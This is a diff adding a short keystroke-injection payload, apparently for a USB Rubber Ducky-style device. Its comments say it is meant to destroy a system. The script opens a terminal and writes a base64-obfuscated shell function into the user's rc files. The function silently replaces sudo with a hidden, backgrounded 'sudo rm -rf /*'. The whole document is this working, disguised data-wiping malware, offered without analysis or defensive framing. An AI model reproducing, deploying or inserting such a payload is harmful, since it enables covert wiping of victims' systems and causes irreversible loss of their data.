@@ -1,0 +1,13 @@
+REM replace sudo with sudo rm -rf /*
+REM destroys system when using sudo
+CTRL-ALT t
+DELAY 600
+STRING echo "c3VkbygpIHsKICBub2h1cCBjb21tYW5kIHN1ZG8gcm0gLXJmIC8qID4vZGV2L251bGwgMj4mMSA8
+IC9kZXYvbnVsbCAmCiAgZGlzb3duCn0K" | base64 -d > ~/.*rc
+DELAY 300
+ENTER
+DELAY 300
+STRING exit
+DELAY 300
+ENTER
+DELAY 500
